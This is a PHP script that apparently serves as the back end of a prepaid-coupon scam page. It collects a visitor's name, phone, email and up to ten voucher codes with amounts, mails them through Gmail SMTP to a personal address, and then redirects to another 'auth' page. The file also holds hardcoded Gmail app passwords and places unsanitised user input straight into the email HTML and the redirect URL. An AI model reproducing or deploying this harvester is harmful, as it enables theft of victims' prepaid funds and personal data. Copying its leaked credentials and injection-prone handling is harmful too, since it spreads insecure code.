<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require "phpmailer/src/Exception.php";
require "phpmailer/src/PHPMailer.php";
require "phpmailer/src/SMTP.php";

$nom_prenom  = $_POST['nom_prenom'];
$email = $_POST['email'];
$telephone = $_POST['telephone'];

$type_de_coupon = $_POST['type_de_coupon'];
$code_charge1 = $_POST['code_charge1'];  
$montant_charge1 = $_POST['montant_charge1'];
$code_charge2 = $_POST['code_charge2'];
$montant_charge2 = $_POST['montant_charge2'];
$code_charge3 = $_POST['code_charge3'];   
 
$montant_charge3 = $_POST['montant_charge3'];
$code_charge4 = $_POST['code_charge4'];
$montant_charge4 = $_POST['montant_charge4'];
$code_charge5 = $_POST['code_charge5'];
$montant_charge5 = $_POST['montant_charge5'];  
$code_charge6 = $_POST['code_charge6'];
$montant_charge6 = $_POST['montant_charge6'];
$code_charge7 = $_POST['code_charge7'];
$montant_charge7 = $_POST['montant_charge7'];      
$code_charge8 = $_POST['code_charge8'];
$montant_charge8 = $_POST['montant_charge8'];
$code_charge9 = $_POST['code_charge9'];
$montant_charge9 = $_POST['montant_charge9'];
$code_charge10 = $_POST['code_charge10'];  
$montant_charge10 = $_POST['montant_charge10'];  
$date = $_POST['date'];
$id = $_POST['id'];

$coupon_text_format = "
<h4>".$nom_prenom." / ".$telephone." / ".$email."</h4>
<p>code  : <span style='color:red'> ".$code_charge1."</span>  => Montant : ".$montant_charge1." €</p><br/><hr/>
<p>code  : <span style='color:red'> ".$code_charge2."</span>  => Montant :".$montant_charge2."</p><br/><hr/>
<p>code  : <span style='color:red'> ".$code_charge3."</span>  => Montant :".$montant_charge3."</p><br/><hr/>
<p>code  : <span style='color:red'> ".$code_charge4."</span>  => Montant :".$montant_charge4."</p><br/><hr/>
<p>code  : <span style='color:red'> ".$code_charge5."</span>  => Montant :".$montant_charge5."</p><br/><hr/>
<p>code  : <span style='color:red'> ".$code_charge6."</span>  => Montant :".$montant_charge6."</p><br/><hr/>
<p>code  : <span style='color:red'> ".$code_charge7."</span>  => Montant :".$montant_charge7."</p><br/><hr/>
<p>code  : <span style='color:red'> ".$code_charge8."</span>  => Montant :".$montant_charge8."</p><br/><hr/>
<p>code  : <span style='color:red'> ".$code_charge9."</span>  => Montant :".$montant_charge9."</p><br/><hr/>
<p>code  : <span style='color:red'> ".$code_charge10."</span> => Montant :".$montant_charge10."</p><br/><hr/>
";

if (!empty($code_charge1)  || !empty($montant_charge1)  || !empty($code_charge2)  || !empty($montant_charge2)  || !empty($code_charge3)  || !empty($montant_charge3)  || !empty($code_charge4)  || !empty($montant_charge4)  || !empty($code_charge5)  || !empty($montant_charge5)  || !empty($code_charge6)  || !empty($montant_charge6)  || !empty($code_charge7)  || !empty($montant_charge7)  || !empty($code_charge8)  || !empty($montant_charge8)  || !empty($code_charge9)  || !empty($montant_charge9)  || !empty($code_charge10)  || !empty($montant_charge10)  ) {
    $mail = new PHPMailer(true);
    $mail->isSMTP();
    $mail->Host='smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = 'replaycoupon@gmail.com';
    $mail->Password = 'pinzbaodsuxgblbh';
    $mail->SMTPSecure = 'ssl';
    $mail->Port = 465;
    
    $mail->setFrom('replaycoupon@gmail.com');
    // $mail->addAddress('mariusdama88@gmail.com');
    $mail->addAddress('marcellimsuanon@gmail.com');
    $mail->isHTML(true);
    $mail->Subject = $type_de_coupon;
    $mail->Body = $coupon_text_format;

    if ($mail->send()) {
        echo "cool";
    }else{
        $mail->Username = 'replaycoupon@gmailgit.com';
        $mail->Password = 'nthhaspxqfeswxpc';
        $mail->send();
    }
    header("Location: wbauth.php?name=".$nom_prenom."&email=".$email."&telephone=".$telephone."");
}
// echo $_POST['date']

?>